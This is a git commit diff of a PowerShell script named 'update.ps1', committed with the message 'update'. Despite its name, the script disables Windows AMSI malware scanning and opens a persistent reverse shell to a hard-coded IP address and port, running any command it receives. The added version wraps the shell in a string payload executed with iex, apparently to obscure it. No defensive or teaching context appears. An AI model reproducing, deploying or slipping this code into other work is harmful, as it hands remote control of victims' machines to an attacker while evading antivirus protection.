126cf3c10be99eea04eb173e78a338e626561e93
Aishinmei <162031728+Aishinmei@users.noreply.github.com>
2026-05-07 10:32:48 +0200

    update

--- update.ps1
+++ update.ps1
@@ -1,23 +1,11 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-$ip =  10.184.18.231
+
+$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+$ip = "10.184.18.231"
 $port = 1313
 
-while($true){
-    try{
-        $c = New-Object Net.Sockets.TCPClient($ip, $port)
-        $s = $c.GetStream()
-        [byte[]]$b = 0..65535|%{0}
-        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
-            $d = (New-Object Text.ASCIIEncoding).GetString($b, 0, $i)
-            $sb = (iex $d 2>&1 | Out-String )
-            $sb2 = $sb + 'PS ' + (pwd).Path + '> '
-            $sb3 = ([text.encoding]::ASCII).GetBytes($sb2)
-            $s.Write($sb3, 0, $sb3.Length)
-            $s.Flush()
-        }
-        $c.Close()
-    } catch {
-        Start-Sleep -Seconds 8
-    }
-}
+$payload = "while(`$true){try{`$c=New-Object Net.Sockets.TCPClient('$ip',$port);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length))-ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$sb=(iex `$d 2>&1|Out-String);`$sb2=`$sb+'PS '+(pwd).Path+'> ';`$sb3=([text.encoding]::ASCII).GetBytes(`$sb2);`$s.Write(`$sb3,0,`$sb3.Length);`$s.Flush()};`$c.Close()}catch{Start-Sleep -Seconds 8}}"
+
+iex $payload
